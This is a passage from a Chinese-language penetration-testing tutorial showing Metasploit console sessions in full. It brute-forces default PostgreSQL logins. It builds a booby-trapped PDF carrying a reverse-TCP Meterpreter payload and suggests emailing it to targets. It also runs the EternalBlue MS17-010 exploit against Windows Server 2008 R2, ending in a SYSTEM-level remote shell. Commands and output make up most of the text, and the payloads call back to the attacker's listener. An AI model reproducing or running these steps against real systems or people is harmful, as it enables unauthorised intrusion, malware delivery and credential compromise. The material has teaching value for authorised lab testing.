                                                              no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                                                                         no        Add all users <span class="keyword">in</span> the current database to the list</span><br><span class="line">   PASSWORD                                                                                        no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line</span><br><span class="line">   Proxies                                                                                         no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RETURN_ROWSET     <span class="literal">true</span>                                                                          no        Set to <span class="literal">true</span> to see query result sets</span><br><span class="line">   RHOSTS                                                                                          yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT             5432                                                                          yes       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                                                                         yes       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                                                                             yes       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                                                                                        no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-separated) users and passwords, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                                                                         no        Try the username as the password <span class="keyword">for</span> all users</span><br><span class="line">   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line</span><br><span class="line">   VERBOSE           <span class="literal">true</span>                                                                          yes       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到所有的配置选项参数。接下来，将配置所有选项参数。</p></li><li><p>配置RHOSTS选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/postgres/postgres_login) &gt; <span class="built_in">set</span> RHOSTS 192.168.10.56</span><br><span class="line">RHOSTS =&gt; 192.168.10.56</span><br></pre></td></tr></table></figure></li><li><p>实施渗透测试。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/postgres/postgres_login) &gt; exploit</span><br><span class="line"> </span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[+] 192.168.29.137:5432 - Login Successful: postgres:postgres@template1</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.29.137:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf5 auxiliary(scanner/postgres/postgres_login) &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，找到了一个有效的用户名和密码，用户名和密码都为postgres。</p></li></ol><h3 id="4-3-PDF文件攻击"><a href="#4-3-PDF文件攻击" class="headerlink" title="4.3 PDF文件攻击"></a>4.3 PDF文件攻击</h3><p>PDF是一种文件格式。该类型文件使用比较广泛，并且容易传输。在前面介绍的渗透测试方法，都是主动实施渗透测试。如果目标主机没有监听服务器类端口时，则需要使用被动渗透测试方式。此时，可以尝试向客户端发送一个带病毒的PDF文件，进而实施被动攻击。</p><p>使用Adobe PDF Embedded EXE模块，创建PDF病毒文件。具体操作步骤如下：</p><ol><li><p>使用adobe_pdf_embedded_exe模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/adobe_pdf_embedded_exe</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) &gt;</span><br></pre></td></tr></table></figure></li><li><p>查看adobe_pdf_embedded_exe模块有效的选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/fileformat/adobe_pdf_embedded_exe):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting                                                                                     Required  Description</span><br><span class="line">   ----            ---------------                                                                                     --------  -----------</span><br><span class="line">   EXENAME                                                                                                             no        The Name of payload exe.</span><br><span class="line">   FILENAME        evil.pdf                                                                                            no        The output filename.</span><br><span class="line">   INFILENAME      /usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf                            yes       The Input PDF filename.</span><br><span class="line">   LAUNCH_MESSAGE  To view the encrypted content please tick the <span class="string">"Do not show this message again"</span> box and press Open.  no        The message to display <span class="keyword">in</span> the File: area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.10.12    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Adobe Reader v8.x, v9.x / Windows XP SP3 (English/Spanish) / Windows Vista/7 (English)</span><br></pre></td></tr></table></figure><p>以上信息显示了adobe_pdf_embedded_exe模块所有可用的选项。从以上输出的信息可以看到，默认使用的PDF病毒文件为template.pdf，输出文件名为evil.pdf。如果用户不想要使用默认的PDF文件时，可以指定自己的病毒文件及输出文件名。</p></li><li><p>设置用户想要生成的PDF文件名。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) &gt; <span class="built_in">set</span> FILENAME test.pdf</span><br><span class="line">FILENAME =&gt; test.pdf</span><br></pre></td></tr></table></figure></li><li><p>设置INFILENAME选项。为了利用该PDF文件，使用该选项指定用户访问的PDF文件位置。如果用户没有一个合适的PDF攻击文件，也可以使用默认的模板文件template.pdf，则无须配置该选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) &gt; <span class="built_in">set</span> INFILENAME /root/evil.pdf</span><br><span class="line">INFILENAME =&gt; /root/evil.pdf</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里指定的PDF文件中不能包含关键字root。否则，无法生成对应的带病毒PDF文件。</p></blockquote></li><li><p>生成PDF病毒文件。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) &gt; exploit </span><br><span class="line">[*] Reading <span class="keyword">in</span> <span class="string">'/root/evil.pdf'</span>...</span><br><span class="line">[*] Parsing <span class="string">'/root/evil.pdf'</span>...</span><br><span class="line">[*] Using <span class="string">'windows/meterpreter/reverse_tcp'</span> as payload...</span><br><span class="line">[*] Parsing Successful. Creating <span class="string">'test.pdf'</span> file...</span><br><span class="line">[+] test.pdf stored at /root/.msf4/<span class="built_in">local</span>/test.pdf</span><br></pre></td></tr></table></figure><p>输出的信息显示test.pdf文件已经生成，而且被保存到/root/.msf4/local目录中。接下来用户可以将创建好的PDF文件通过邮件或其他方式发送到目标主机，然后在本地建立监听。当目标主机用户打开该PDF文件时，将可能被攻击。</p></li></ol><h3 id="4-4-利用MS17-010漏洞实施攻击"><a href="#4-4-利用MS17-010漏洞实施攻击" class="headerlink" title="4.4 利用MS17_010漏洞实施攻击"></a>4.4 利用MS17_010漏洞实施攻击</h3><p>MS17_010是“永恒之蓝”（勒索病毒）所利用的一个Microsoft Windows漏洞。渗透测试者通过利用该漏洞向Microsoft服务器消息块1.0（SMBv1）服务器发送经特殊设计的消息，就可能允许远程代码执行。下面将介绍利用MS17_010漏洞对目标主机Windows Server 2008 R2(x64)实施渗透测试。</p><p>利用MS17_010漏洞实施渗透测试。具体操作步骤如下：</p><ol><li><p>查询可利用MS17_010漏洞的渗透测试模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span class="keyword">for</span> Win8+</span><br><span class="line">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，找到5个可使用的渗透测试模块。通过分析描述信息可知，第2个是扫描模块；第3个是漏洞利用模块。此时，在实施渗透测试之前，使用扫描模块探测目标是否存在该漏洞。</p></li><li><p>选择smb_ms17_010模块，并查看其配置选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   <span class="literal">true</span>                                                            no        Check <span class="keyword">for</span> architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="literal">true</span>                                                            no        Check <span class="keyword">for</span> DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="literal">false</span>                                                           no        Check <span class="keyword">for</span> named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS                                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads (max one per host)</span><br></pre></td></tr></table></figure><p>以上输出信息显示了当前模块的所有配置选项。此时仅设置一个目标地址即可运行该模块，以探测目标是否存在MS17_010漏洞。</p></li><li><p>配置RHOSTS选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.100.246</span><br><span class="line">RHOSTS =&gt; 192.168.100.246</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，指定扫描的目标主机地址为192.168.100.246。</p></li><li><p>实施漏洞扫描测试。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br><span class="line">[+] 192.168.100.246:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.100.246:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，目标主机中存在MS17_010漏洞。接下来将利用该漏洞对目标主机实施渗透测试。</p></li><li><p>选择ms17_010_eternalblue模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;</span><br></pre></td></tr></table></figure></li><li><p>加载攻击载荷。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看所有的配置选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             yes       Check <span class="keyword">if</span> remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             yes       Check <span class="keyword">if</span> remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.10.75    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到所有的配置选项参数。接下来将配置必须配置的选项：RHOSTS和LHOST。</p></li><li><p>配置选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 192.168.100.246</span><br><span class="line">RHOSTS =&gt; 192.168.100.246</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.10.75</span><br><span class="line">LHOST =&gt; 192.168.10.75</span><br></pre></td></tr></table></figure></li><li><p>实施渗透测试。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.10.75:4444 </span><br><span class="line">[*] 192.168.100.246:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.100.246:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.100.246:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 192.168.100.246:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.100.246:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.100.246:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.100.246:445 - CORE raw buffer dump (53 bytes)</span><br><span class="line">[*] 192.168.100.246:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 192.168.100.246:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris</span><br><span class="line">[*] 192.168.100.246:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P</span><br><span class="line">[*] 192.168.100.246:445 - 0x00000030  61 63 6b 20 31                                   ack 1           </span><br><span class="line">[+] 192.168.100.246:445 - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.100.246:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.100.246:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.100.246:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.100.246:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.100.246:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.100.246:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.100.246:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.100.246:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.100.246:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.100.246:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.100.246:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 192.168.100.246</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.10.75:4444 -&gt; 192.168.100.246:49159) at 2020-12-22 17:23:14 +0800</span><br><span class="line">[+] 192.168.100.246:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.100.246:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.100.246:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功获取到一个Meterperter会话。而且，命令行提示符显示为meterpreter&gt;。此时，用户可以在Meterpreter Shell下执行大量的命令。用户可以使用help命令查看支持的所有命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line">    Command                       Description</span><br><span class="line">    -------                       -----------</span><br><span class="line">    ?                             Help menu</span><br><span class="line">    background                    Backgrounds the current session</span><br><span class="line">    <span class="built_in">bg</span>                            Alias <span class="keyword">for</span> background</span><br><span class="line">    bgkill                        Kills a background meterpreter script</span><br><span class="line">    bglist                        Lists running background scripts</span><br><span class="line">    bgrun                         Executes a meterpreter script as a background thread</span><br><span class="line">    channel                       Displays information or control active channels</span><br><span class="line">    close                         Closes a channel</span><br><span class="line">    disable_unicode_encoding      Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding       Enables encoding of unicode strings</span><br><span class="line">    <span class="built_in">exit</span>                          Terminate the meterpreter session</span><br><span class="line">    get_timeouts                  Get the current session timeout values</span><br><span class="line">…//省略部分内容//…</span><br></pre></td></tr></table></figure><p>以上输出的信息显示了Meterpreter命令行下可运行的所有命令。输出的信息中每个命令的作用都有详细的描述。用户可以根据自己的需要执行相应的命令。</p></li><li><p>进入目标主机的Shell。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell </span><br><span class="line">Process 3008 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [汾 6.1.7601]</span><br><span class="line"> (c) 2009 Microsoft Corporation</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，成功进入了目标系统的命令行界面。其中，中文内容会以乱码形式显示。如果用户需要退出，需输入exit命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功退出了目标主机的Shell，返回到Meterpreter会话。</p></li><li><p>从Meterpreter会话返回到MSF终端。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，命令行提示符显示为msf5 exploit(windows/smb/ms17_010_eternalblue)&gt;。由此可以说明，已成功返回到MSF终端。如果想要再次进入Meterpreter会话，可以使用sessions命令实现。使用sessions命令查看建立的Meterpreter会话。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                            Connection</span><br><span class="line">  --  ----  ----                     -----------                            ----------</span><br><span class="line">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-FJQ974EQ9HI  192.168.10.75:4444 -&gt; 192.168.100.246:49159 